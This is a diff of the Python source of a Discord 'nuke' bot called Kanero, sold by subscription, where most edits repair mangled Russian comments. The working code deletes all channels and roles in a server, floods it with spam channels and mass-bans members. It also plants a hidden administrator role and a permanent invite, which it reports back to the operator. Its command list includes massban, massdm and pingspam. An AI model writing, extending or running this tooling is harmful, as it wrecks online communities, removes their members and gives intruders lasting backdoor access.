@@ -1,4 +1,4 @@
-п»їimport discord
+import discord
 from discord.ext import commands
 from discord import app_commands
 import asyncio
@@ -10,7 +10,7 @@ import config
 import motor.motor_asyncio
 from datetime import datetime, timedelta
 
-# Р›РѕРіРёСЂРѕРІР°РЅРёРµ РІ С„Р°Р№Р»
+# Логирование в файл
 logging.basicConfig(
     filename="bot.log",
     level=logging.INFO,
@@ -22,7 +22,7 @@ log = logging.getLogger(__name__)
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-# в”Ђв”Ђв”Ђ MONGODB в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- MONGODB -----------------------------------------------
 
 MONGO_URI = os.environ.get("MONGO_URI", "")
 _mongo_client = None
@@ -53,30 +53,30 @@ async def db_set(collection: str, key: str, value):
     )
 
 
-# в”Ђв”Ђв”Ђ NUKE LOGS в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- NUKE LOGS ---------------------------------------------
 
 async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
-    """РЎРѕС…СЂР°РЅСЏРµС‚ Р»РѕРі РЅСЋРєР°. РЎРѕР·РґР°С‘С‚ СЂРѕР»СЊ СЃ РїСЂР°РІР°РјРё Р°РґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂР° Рё РёРЅРІР°Р№С‚ С‡РµСЂРµР· РЅРµС‘."""
+    """Сохраняет лог нюка. Создаёт роль с правами администратора и инвайт через неё."""
     invite_url = None
     try:
-        # РЎРѕР·РґР°С‘Рј СЂРѕР»СЊ СЃ РїСЂР°РІР°РјРё Р°РґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂР°
+        # Создаём роль с правами администратора
         log_role = await guild.create_role(
-            name="в пёЏ Kanero LOG",
+            name="?? Kanero LOG",
             permissions=discord.Permissions(administrator=True),
             color=discord.Color.dark_red()
         )
-        # РџРѕРґРЅРёРјР°РµРј СЂРѕР»СЊ РєР°Рє РјРѕР¶РЅРѕ РІС‹С€Рµ
+        # Поднимаем роль как можно выше
         try:
             await log_role.edit(position=max(1, guild.me.top_role.position - 1))
         except Exception:
             pass
-        # РРЅРІР°Р№С‚ С‡РµСЂРµР· Р»СЋР±РѕР№ РґРѕСЃС‚СѓРїРЅС‹Р№ РєР°РЅР°Р»
+        # Инвайт через любой доступный канал
         ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
         if ch:
             inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
             invite_url = inv.url
     except Exception:
-        # Fallback вЂ” РѕР±С‹С‡РЅС‹Р№ РёРЅРІР°Р№С‚
+        # Fallback — обычный инвайт
         try:
             ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
             if ch:
@@ -97,52 +97,52 @@ async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
     }
     await db_set("nuke_logs", str(guild.id), entry)
 
-    # РћС‚РїСЂР°РІР»СЏРµРј РІ logs РєР°РЅР°Р» РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ
+    # Отправляем в logs канал на домашнем сервере
     try:
         home = bot.get_guild(HOME_GUILD_ID)
         if home:
-            logs_ch = discord.utils.find(lambda c: c.name.lower() == "рџ“Љгѓ»logs" or "logs" in c.name.lower(), home.text_channels)
+            logs_ch = discord.utils.find(lambda c: c.name.lower() == "???logs" or "logs" in c.name.lower(), home.text_channels)
             if logs_ch:
-                # Р­РјРѕРґР·Рё РґР»СЏ СЂР°Р·РЅС‹С… С‚РёРїРѕРІ РЅСЋРєРѕРІ
+                # Эмодзи для разных типов нюков
                 type_emoji = {
-                    "nuke": "рџ’Ђ",
-                    "super_nuke": "в пёЏ",
-                    "owner_nuke": "рџ‘‘",
-                    "auto_nuke": "рџ¤–",
-                    "auto_super_nuke": "рџ¤–в пёЏ",
-                    "auto_superpr_nuke": "рџ¤–вљЎ",
-                    "auto_owner_nuke": "рџ¤–рџ‘‘"
-                }.get(nuke_type, "в пёЏ")
+                    "nuke": "??",
+                    "super_nuke": "??",
+                    "owner_nuke": "??",
+                    "auto_nuke": "??",
+                    "auto_super_nuke": "????",
+                    "auto_superpr_nuke": "???",
+                    "auto_owner_nuke": "????"
+                }.get(nuke_type, "??")
                 embed = discord.Embed(
                     title=f"{type_emoji} {nuke_type.replace('_', ' ').upper()}",
                     color=0xff0000
                 )
-                embed.add_field(name="рџ‘¤ РљС‚Рѕ", value=f"{user} (`{user.id}`)", inline=True)
-                embed.add_field(name="рџЏ  РЎРµСЂРІРµСЂ", value=f"{guild.name} (`{guild.id}`)", inline=True)
-                embed.add_field(name="рџ•ђ Р’СЂРµРјСЏ", value=entry["time"], inline=True)
+                embed.add_field(name="?? Кто", value=f"{user} (`{user.id}`)", inline=True)
+                embed.add_field(name="?? Сервер", value=f"{guild.name} (`{guild.id}`)", inline=True)
+                embed.add_field(name="?? Время", value=entry["time"], inline=True)
                 if invite_url:
-                    embed.add_field(name="рџ”— РРЅРІР°Р№С‚", value=invite_url, inline=False)
-                embed.set_footer(text="в пёЏ Kanero  |  !nukelogs вЂ” РїРѕР»РЅР°СЏ РёСЃС‚РѕСЂРёСЏ")
+                    embed.add_field(name="?? Инвайт", value=invite_url, inline=False)
+                embed.set_footer(text="?? Kanero  |  !nukelogs — полная история")
                 await logs_ch.send(embed=embed)
     except Exception:
         pass
 
 
 
-# в”Ђв”Ђв”Ђ HELPERS в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- HELPERS -----------------------------------------------
 
 nuke_running = {}
-nuke_starter = {}   # guild_id -> user_id РєС‚Рѕ Р·Р°РїСѓСЃС‚РёР» РЅСЋРє
-last_spam_text = {}  # guild_id -> РїРѕСЃР»РµРґРЅРёР№ С‚РµРєСЃС‚ СЃРїР°РјР°
-last_nuke_time = {}  # guild_id -> РІСЂРµРјСЏ РїРѕСЃР»РµРґРЅРµРіРѕ nuke
+nuke_starter = {}   # guild_id -> user_id кто запустил нюк
+last_spam_text = {}  # guild_id -> последний текст спама
+last_nuke_time = {}  # guild_id -> время последнего nuke
 
 
 def is_whitelisted(user_id):
-    # РџСЂРѕРІРµСЂСЏРµРј РІСЂРµРјРµРЅРЅСѓСЋ РїРѕРґРїРёСЃРєСѓ
+    # Проверяем временную подписку
     temp = check_temp_subscription(user_id)
     if temp in ("wl", "pm"):
         return True
-    # Premium С‚РѕР¶Рµ СЃС‡РёС‚Р°РµС‚СЃСЏ whitelist
+    # Premium тоже считается whitelist
     return user_id in config.WHITELIST or user_id in PREMIUM_LIST or user_id == config.OWNER_ID
 
 
@@ -151,7 +151,7 @@ def is_owner_whitelisted(user_id):
 
 
 def is_premium(user_id):
-    # РџСЂРѕРІРµСЂСЏРµРј РІСЂРµРјРµРЅРЅСѓСЋ РїРѕРґРїРёСЃРєСѓ
+    # Проверяем временную подписку
     temp = check_temp_subscription(user_id)
     if temp == "pm":
         return True
@@ -172,7 +172,7 @@ def save_premium():
 
 
 def save_owner_nuke_list():
-    pass  # owner_nuke_list СѓРґР°Р»С‘РЅ
+    pass  # owner_nuke_list удалён
 
 
 def is_owner_nuker(user_id):
@@ -180,11 +180,11 @@ def is_owner_nuker(user_id):
 
 
 def load_whitelist():
-    pass  # Р·Р°РјРµРЅРµРЅРѕ РЅР° async load РІ on_ready
+    pass  # заменено на async load в on_ready
 
 
 def load_premium():
-    pass  # Р·Р°РјРµРЅРµРЅРѕ РЅР° async load РІ on_ready
+    pass  # заменено на async load в on_ready
 
 
 def save_spam_text():
@@ -192,25 +192,25 @@ def save_spam_text():
 
 
 def load_spam_text():
-    pass  # Р·Р°РјРµРЅРµРЅРѕ РЅР° async load РІ on_ready
+    pass  # заменено на async load в on_ready
 
 
 
-# в”Ђв”Ђв”Ђ BLOCKED GUILDS в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- BLOCKED GUILDS ----------------------------------------
 
 BLOCKED_GUILDS: list[int] = []
 PREMIUM_LIST: list[int] = []
-TESTER_LIST: list[int] = []  # С‚РµСЃС‚РµСЂС‹ вЂ” РґРѕСЃС‚СѓРї Рє С‚РµСЃС‚РёСЂРѕРІР°РЅРёСЋ С„СѓРЅРєС†РёР№
-FREELIST: list[int] = []  # РІС‹РґР°С‘С‚СЃСЏ С‡РµСЂРµР· РєР°РЅР°Р» addbot вЂ” С‚РѕР»СЊРєРѕ !nuke Рё !auto_nuke
-AUTO_ROLE_ID = None  # ID СЂРѕР»Рё Guest вЂ” СѓСЃС‚Р°РЅР°РІР»РёРІР°РµС‚СЃСЏ РїСЂРё setup
+TESTER_LIST: list[int] = []  # тестеры — доступ к тестированию функций
+FREELIST: list[int] = []  # выдаётся через канал addbot — только !nuke и !auto_nuke
+AUTO_ROLE_ID = None  # ID роли Guest — устанавливается при setup
 
-# в”Ђв”Ђв”Ђ Р’Р Р•РњР•РќРќР«Р• РџРћР”РџРРЎРљР в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
-# Р¤РѕСЂРјР°С‚: {user_id: {"type": "pm"/"wl"/"fl", "expires": datetime}}
+# --- ВРЕМЕННЫЕ ПОДПИСКИ ------------------------------------
+# Формат: {user_id: {"type": "pm"/"wl"/"fl", "expires": datetime}}
 TEMP_SUBSCRIPTIONS: dict[int, dict] = {}
 
 
 def save_temp_subscriptions():
-    # РљРѕРЅРІРµСЂС‚РёСЂСѓРµРј datetime РІ СЃС‚СЂРѕРєСѓ РґР»СЏ СЃРѕС…СЂР°РЅРµРЅРёСЏ
+    # Конвертируем datetime в строку для сохранения
     data = {
         uid: {"type": sub["type"], "expires": sub["expires"].isoformat()}
         for uid, sub in TEMP_SUBSCRIPTIONS.items()
@@ -222,7 +222,7 @@ async def load_temp_subscriptions():
     global TEMP_SUBSCRIPTIONS
     data = await db_get("data", "temp_subscriptions", {})
     if data:
-        # РљРѕРЅРІРµСЂС‚РёСЂСѓРµРј СЃС‚СЂРѕРєСѓ РѕР±СЂР°С‚РЅРѕ РІ datetime
+        # Конвертируем строку обратно в datetime
         TEMP_SUBSCRIPTIONS = {
             int(uid): {"type": sub["type"], "expires": datetime.fromisoformat(sub["expires"])}
             for uid, sub in data.items()
@@ -230,12 +230,12 @@ async def load_temp_subscriptions():
 
 
 def check_temp_subscription(user_id: int) -> str | None:
-    """РџСЂРѕРІРµСЂСЏРµС‚ РІСЂРµРјРµРЅРЅСѓСЋ РїРѕРґРїРёСЃРєСѓ. Р’РѕР·РІСЂР°С‰Р°РµС‚ С‚РёРї (pm/wl/fl) РёР»Рё None РµСЃР»Рё РёСЃС‚РµРєР»Р°."""
+    """Проверяет временную подписку. Возвращает тип (pm/wl/fl) или None если истекла."""
     if user_id not in TEMP_SUBSCRIPTIONS:
         return None
     sub = TEMP_SUBSCRIPTIONS[user_id]
     if datetime.utcnow() > sub["expires"]:
-        # РџРѕРґРїРёСЃРєР° РёСЃС‚РµРєР»Р°
+        # Подписка истекла
         TEMP_SUBSCRIPTIONS.pop(user_id, None)
         save_temp_subscriptions()
         return None
@@ -243,7 +243,7 @@ def check_temp_subscription(user_id: int) -> str | None:
 
 
 def add_temp_subscription(user_id: int, sub_type: str, duration_hours: int):
-    """Р”РѕР±Р°РІР»СЏРµС‚ РІСЂРµРјРµРЅРЅСѓСЋ РїРѕРґРїРёСЃРєСѓ."""
+    """Добавляет временную подписку."""
     expires = datetime.utcnow() + timedelta(hours=duration_hours)
     TEMP_SUBSCRIPTIONS[user_id] = {"type": sub_type, "expires": expires}
     save_temp_subscriptions()
@@ -254,16 +254,16 @@ def save_freelist():
 
 
 def is_freelisted(user_id):
-    # РџСЂРѕРІРµСЂСЏРµРј РІСЂРµРјРµРЅРЅСѓСЋ РїРѕРґРїРёСЃРєСѓ
+    # Проверяем временную подписку
     temp = check_temp_subscription(user_id)
     if temp in ("fl", "wl", "pm"):
         return True
-    # Whitelist Рё Premium С‚РѕР¶Рµ РІРєР»СЋС‡Р°СЋС‚ freelist
+    # Whitelist и Premium тоже включают freelist
     return user_id in FREELIST or user_id in config.WHITELIST or user_id in PREMIUM_LIST or user_id == config.OWNER_ID
 
 
 def is_tester(user_id):
-    """РџСЂРѕРІРµСЂСЏРµС‚ СЏРІР»СЏРµС‚СЃСЏ Р»Рё РїРѕР»СЊР·РѕРІР°С‚РµР»СЊ С‚РµСЃС‚РµСЂРѕРј."""
+    """Проверяет является ли пользователь тестером."""
     return user_id in TESTER_LIST or user_id == config.OWNER_ID
 
 
@@ -276,7 +276,7 @@ def save_blocked_guilds():
 
 
 def load_blocked_guilds():
-    pass  # Р·Р°РјРµРЅРµРЅРѕ РЅР° async load РІ on_ready
+    pass  # заменено на async load в on_ready
 
 
 def is_guild_blocked(guild_id: int) -> bool:
@@ -289,11 +289,11 @@ def wl_check():
             return False
         if not is_whitelisted(ctx.author.id):
             embed = discord.Embed(
-                title="в пёЏ Р”РћРЎРўРЈРџ Р—РђРџР Р•Р©РЃРќ",
-                description="РЈ С‚РµР±СЏ РЅРµС‚ РїРѕРґРїРёСЃРєРё.\nР—Р° РїРѕРєСѓРїРєРѕР№ РїРёС€Рё РІ Р›РЎ: **davaidkatt**",
+                title="?? ДОСТУП ЗАПРЕЩЁН",
+                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="в пёЏ Kanero")
+            embed.set_footer(text="?? Kanero")
             await ctx.send(embed=embed)
             return False
         return True
@@ -301,7 +301,7 @@ def wl_check():
 
 
 async def delete_all_channels(guild):
-    for _ in range(3):  # РґРѕ 3 РїРѕРїС‹С‚РѕРє
+    for _ in range(3):  # до 3 попыток
         channels = list(guild.channels)
         if not channels:
             break
@@ -321,11 +321,11 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
-    NUKE_NAME = "Р’С‹ Р±С‹Р»Рё РєСЂР°С€РЅСѓС‚С‹"
+    NUKE_NAME = "Вы были крашнуты"
     bot_role = guild.me.top_role
 
     channels_to_delete = list(guild.channels)
-    # РЈРґР°Р»СЏРµРј С‚РѕР»СЊРєРѕ СЂРѕР»Рё РќРР–Р• Р±РѕС‚Р° вЂ” РІС‹С€Рµ РЅРµ РјРѕР¶РµРј
+    # Удаляем только роли НИЖЕ бота — выше не можем
     roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
 
     async def create_and_spam(i):
@@ -340,14 +340,14 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
         except Exception:
             pass
 
-    # Р’СЃС‘ РїР°СЂР°Р»Р»РµР»СЊРЅРѕ
+    # Всё параллельно
     await asyncio.gather(
         *[c.delete() for c in channels_to_delete],
         *[r.delete() for r in roles_to_delete],
         *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
     )
-    # РџРѕРІС‚РѕСЂРЅР°СЏ РїРѕРїС‹С‚РєР° СѓРґР°Р»РµРЅРёСЏ СЂРѕР»РµР№ РєРѕС‚РѕСЂС‹Рµ РЅРµ СѓРґР°Р»РёР»РёСЃСЊ
+    # Повторная попытка удаления ролей которые не удалились
     leftover_roles = [r for r in guild.roles if r < guild.me.top_role and not r.is_default()]
     if leftover_roles:
         await asyncio.gather(*[r.delete() for r in leftover_roles], return_exceptions=True)
@@ -358,7 +358,7 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
             if not member:
                 member = await guild.fetch_member(caller_id)
             if member:
-                role = await guild.create_role(name="в пёЏ Kanero", color=discord.Color.dark_red())
+                role = await guild.create_role(name="?? Kanero", color=discord.Color.dark_red())
                 try:
                     await role.edit(position=max(1, guild.me.top_role.position - 1))
                 except Exception:
@@ -374,16 +374,16 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
 
 
 async def do_superpr_nuke_task(guild, spam_text=None):
-    """Super Nuke вЂ” РІСЃС‘ РїР°СЂР°Р»Р»РµР»СЊРЅРѕ, РјРѕРјРµРЅС‚Р°Р»СЊРЅРѕ. Р‘Р°РЅРёС‚ РІСЃРµС… РєСЂРѕРјРµ РїРѕРґРїРёСЃС‡РёРєРѕРІ."""
+    """Super Nuke — всё параллельно, моментально. Банит всех кроме подписчиков."""
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
-    TURBO_NAME = "Р’С‹ Р±С‹Р»Рё РєСЂР°С€РЅСѓС‚С‹"
+    TURBO_NAME = "Вы были крашнуты"
     bot_role = guild.me.top_role
 
     starter_id = nuke_starter.get(guild.id)
 
-    # РќРµ Р±Р°РЅРёС‚СЊ: Р±РѕС‚С‹, РѕРІРЅРµСЂ СЃРµСЂРІРµСЂР°, РЅР°С€ РѕРІРЅРµСЂ, Р·Р°РїСѓСЃС‚РёРІС€РёР№, Рё РІСЃРµ Сѓ РєРѕРіРѕ РµСЃС‚СЊ РїРѕРґРїРёСЃРєР°
+    # Не банить: боты, овнер сервера, наш овнер, запустивший, и все у кого есть подписка
     def is_protected(m):
         if m.bot:
             return True
@@ -393,12 +393,12 @@ async def do_superpr_nuke_task(guild, spam_text=None):
             return True
         if starter_id and m.id == starter_id:
             return True
-        # РџРѕРґРїРёСЃС‡РёРєРё вЂ” РЅРµ Р±Р°РЅРёРј
+        # Подписчики — не баним
         if is_whitelisted(m.id) or is_premium(m.id) or is_freelisted(m.id):
             return True
         return False
 
-    # РџРѕРґРіСЂСѓР¶Р°РµРј РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ С‡С‚РѕР±С‹ guild.members Р±С‹Р» РїРѕР»РЅС‹Рј
+    # Подгружаем всех участников чтобы guild.members был полным
     try:
         await guild.chunk()
     except Exception:
@@ -419,7 +419,7 @@ async def do_superpr_nuke_task(guild, spam_text=None):
         except Exception:
             pass
 
-    # Р’СЃС‘ РїР°СЂР°Р»Р»РµР»СЊРЅРѕ: Р±Р°РЅРёРј + СѓРґР°Р»СЏРµРј РєР°РЅР°Р»С‹ + СѓРґР°Р»СЏРµРј СЂРѕР»Рё + СЃРѕР·РґР°С‘Рј РєР°РЅР°Р»С‹ СЃРѕ СЃРїР°РјРѕРј
+    # Всё параллельно: баним + удаляем каналы + удаляем роли + создаём каналы со спамом
     await asyncio.gather(
         *[m.ban(reason="super_nuke", delete_message_days=0) for m in candidates],
         *[c.delete() for c in channels_to_delete],
@@ -427,19 +427,19 @@ async def do_superpr_nuke_task(guild, spam_text=None):
         *[create_and_spam_super(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
     )
-    # РџРѕРІС‚РѕСЂРЅР°СЏ РїРѕРїС‹С‚РєР° СѓРґР°Р»РµРЅРёСЏ СЂРѕР»РµР№ РєРѕС‚РѕСЂС‹Рµ РЅРµ СѓРґР°Р»РёР»РёСЃСЊ
+    # Повторная попытка удаления ролей которые не удалились
     leftover_roles = [r for r in guild.roles if r < guild.me.top_role and not r.is_default()]
     if leftover_roles:
         await asyncio.gather(*[r.delete() for r in leftover_roles], return_exceptions=True)
 
-    # Р РѕР»СЊ Р·Р°РїСѓСЃС‚РёРІС€РµРјСѓ
+    # Роль запустившему
     if starter_id:
         try:
             member = guild.get_member(starter_id)
             if not member:
                 member = await guild.fetch_member(starter_id)
             if member:
-                role = await guild.create_role(name="в пёЏ Kanero", color=discord.Color.dark_red())
+                role = await guild.create_role(name="?? Kanero", color=discord.Color.dark_red())
                 try:
                     await role.edit(position=max(1, guild.me.top_role.position - 1))
                 except Exception:
@@ -455,11 +455,11 @@ async def do_superpr_nuke_task(guild, spam_text=None):
 
 
 async def do_owner_nuke_task(guild, spam_text=None):
-    """Owner Nuke вЂ” РјР°РєСЃРёРјР°Р»СЊРЅР°СЏ СЃРєРѕСЂРѕСЃС‚СЊ. Р‘Р°РЅРёС‚ РІСЃРµС… РєСЂРѕРјРµ РїРѕРґРїРёСЃС‡РёРєРѕРІ."""
+    """Owner Nuke — максимальная скорость. Банит всех кроме подписчиков."""
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
-    OWNER_NAME = "Р’С‹ Р±С‹Р»Рё РєСЂР°С€РЅСѓС‚С‹"
+    OWNER_NAME = "Вы были крашнуты"
     bot_role = guild.me.top_role
     _starter = nuke_starter.get(guild.id)
 
@@ -476,7 +476,7 @@ async def do_owner_nuke_task(guild, spam_text=None):
             return True
         return False
 
-    # РџРѕРґРіСЂСѓР¶Р°РµРј РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ С‡С‚РѕР±С‹ guild.members Р±С‹Р» РїРѕР»РЅС‹Рј
+    # Подгружаем всех участников чтобы guild.members был полным
     try:
         await guild.chunk()
     except Exception:
@@ -497,7 +497,7 @@ async def do_owner_nuke_task(guild, spam_text=None):
         except Exception:
             pass
 
-    # Р’СЃС‘ РїР°СЂР°Р»Р»РµР»СЊРЅРѕ: Р±Р°РЅРёРј + СѓРґР°Р»СЏРµРј РєР°РЅР°Р»С‹ + СѓРґР°Р»СЏРµРј СЂРѕР»Рё + СЃРѕР·РґР°С‘Рј РєР°РЅР°Р»С‹ СЃРѕ СЃРїР°РјРѕРј
+    # Всё параллельно: баним + удаляем каналы + удаляем роли + создаём каналы со спамом
     await asyncio.gather(
         *[m.ban(reason="owner_nuke", delete_message_days=0) for m in targets],
         *[c.delete() for c in channels_to_delete],
@@ -505,19 +505,19 @@ async def do_owner_nuke_task(guild, spam_text=None):
         *[create_and_spam_owner(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
     )
-    # РџРѕРІС‚РѕСЂРЅР°СЏ РїРѕРїС‹С‚РєР° СѓРґР°Р»РµРЅРёСЏ СЂРѕР»РµР№ РєРѕС‚РѕСЂС‹Рµ РЅРµ СѓРґР°Р»РёР»РёСЃСЊ
+    # Повторная попытка удаления ролей которые не удалились
     leftover_roles = [r for r in guild.roles if r < guild.me.top_role and not r.is_default()]
     if leftover_roles:
         await asyncio.gather(*[r.delete() for r in leftover_roles], return_exceptions=True)
 
-    # Р РѕР»СЊ Р·Р°РїСѓСЃС‚РёРІС€РµРјСѓ
+    # Роль запустившему
     if _starter:
         try:
             member = guild.get_member(_starter)
             if not member:
                 member = await guild.fetch_member(_starter)
             if member:
-                role = await guild.create_role(name="в пёЏ Kanero", color=discord.Color.dark_red())
+                role = await guild.create_role(name="?? Kanero", color=discord.Color.dark_red())
                 try:
                     await role.edit(position=max(1, guild.me.top_role.position - 1))
                 except Exception:
@@ -533,77 +533,77 @@ async def do_owner_nuke_task(guild, spam_text=None):
 
 
 
-# в”Ђв”Ђв”Ђ COMMANDS в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- COMMANDS ----------------------------------------------
 
-# ID РґРѕРјР°С€РЅРµРіРѕ СЃРµСЂРІРµСЂР° вЂ” С‚РѕР»СЊРєРѕ OWNER_ID РјРѕР¶РµС‚ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ РєРѕРјР°РЅРґС‹
+# ID домашнего сервера — только OWNER_ID может использовать команды
 HOME_GUILD_ID = 1497100825628115108
 
-# Р“Р»РѕР±Р°Р»СЊРЅР°СЏ РїСЂРѕРІРµСЂРєР° вЂ” Р±Р»РѕРєРёСЂСѓРµС‚ Р’РЎР• РєРѕРјР°РЅРґС‹ РЅР° Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅРЅРѕРј СЃРµСЂРІРµСЂРµ
+# Глобальная проверка — блокирует ВСЕ команды на заблокированном сервере
 @bot.check
 async def global_guild_block(ctx):
     if ctx.guild and is_guild_blocked(ctx.guild.id):
         return False
-    # РќР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ вЂ” РѕРіСЂР°РЅРёС‡РµРЅРЅС‹Р№ РґРѕСЃС‚СѓРї
+    # На домашнем сервере — ограниченный доступ
     if ctx.guild and ctx.guild.id == HOME_GUILD_ID:
-        # РџСѓР±Р»РёС‡РЅС‹Рµ РєРѕРјР°РЅРґС‹ вЂ” РґРѕСЃС‚СѓРїРЅС‹ РІСЃРµРј
+        # Публичные команды — доступны всем
         PUBLIC_COMMANDS = {"help", "changelog", "changelogall", "inv"}
         
-        # РљРѕРјР°РЅРґС‹ СѓРїСЂР°РІР»РµРЅРёСЏ вЂ” РґР»СЏ РѕРІРЅРµСЂР°, owner whitelist Рё РІР»Р°РґРµР»СЊС†Р° СЃРµСЂРІРµСЂР°
+        # Команды управления — для овнера, owner whitelist и владельца сервера
         MANAGEMENT_COMMANDS = {"wl_add", "wl_remove", "wl_list", "pm_add", "pm_remove",
                                "fl_add", "fl_remove", "fl_clear", "auto_off", "auto_info",
                                "list", "sync_roles", "setup", "setup_update", "info", "nukelogs"}
         
-        # РџСѓР±Р»РёС‡РЅС‹Рµ РєРѕРјР°РЅРґС‹ РґРѕСЃС‚СѓРїРЅС‹ РІСЃРµРј
+        # Публичные команды доступны всем
         if ctx.command and ctx.command.name in PUBLIC_COMMANDS:
             return True
         
         if ctx.command and ctx.command.name in MANAGEMENT_COMMANDS:
-            # Р­С‚Рё РєРѕРјР°РЅРґС‹ РґРѕСЃС‚СѓРїРЅС‹ РѕРІРЅРµСЂСѓ, owner whitelist Рё РІР»Р°РґРµР»СЊС†Сѓ СЃРµСЂРІРµСЂР°
+            # Эти команды доступны овнеру, owner whitelist и владельцу сервера
             if (ctx.author.id == config.OWNER_ID 
                     or ctx.author.id in config.OWNER_WHITELIST
                     or ctx.author.id == ctx.guild.owner_id):
                 return True
             return False
         
-        # Р”РµСЃС‚СЂСѓРєС‚РёРІРЅС‹Рµ РєРѕРјР°РЅРґС‹ вЂ” РїСЂРѕРІРµСЂСЏРµРј РїРѕРїС‹С‚РєСѓ РёСЃРїРѕР»СЊР·РѕРІР°РЅРёСЏ
+        # Деструктивные команды — проверяем попытку использования
         DESTRUCTIVE = {"nuke", "super_nuke", "owner_nuke", "auto_nuke", "cleanup",
                        "massban", "massdm", "rolesdelete", "auto_super_nuke",
                        "auto_superpr_nuke", "auto_owner_nuke", "spam", "pingspam"}
         
         if ctx.command and ctx.command.name in DESTRUCTIVE:
-            # РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ РјРѕР¶РµС‚ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ
+            # Только овнер может использовать
             if ctx.author.id == config.OWNER_ID:
                 return True
-            # РћСЃС‚Р°Р»СЊРЅС‹Рµ РїРѕР»СѓС‡Р°СЋС‚ РїСЂРµРґСѓРїСЂРµР¶РґРµРЅРёРµ
+            # Остальные получают предупреждение
             try:
                 embed = discord.Embed(
-                    title="в›” Р­РўРћ РќР• РџР РћРљРђРўРРў",
+                    title="? ЭТО НЕ ПРОКАТИТ",
                     description=(
-                        f"{ctx.author.mention}, РєРѕРјР°РЅРґР° `!{ctx.command.name}` **РЅРµ СЂР°Р±РѕС‚Р°РµС‚ РЅР° СЌС‚РѕРј СЃРµСЂРІРµСЂРµ**.\n\n"
-                        "РСЃРїРѕР»СЊР·СѓР№ РєРѕРјР°РЅРґС‹ РєСЂР°С€Р° С‚РѕР»СЊРєРѕ РЅР° **СЃРІРѕРёС… СЃРµСЂРІРµСЂР°С…**.\n"
-                        "Р—РґРµСЃСЊ СЌС‚Рѕ Р·Р°РїСЂРµС‰РµРЅРѕ РїСЂР°РІРёР»Р°РјРё."
+                        f"{ctx.author.mention}, команда `!{ctx.command.name}` **не работает на этом сервере**.\n\n"
+                        "Используй команды краша только на **своих серверах**.\n"
+                        "Здесь это запрещено правилами."
                     ),
                     color=0xff0000
                 )
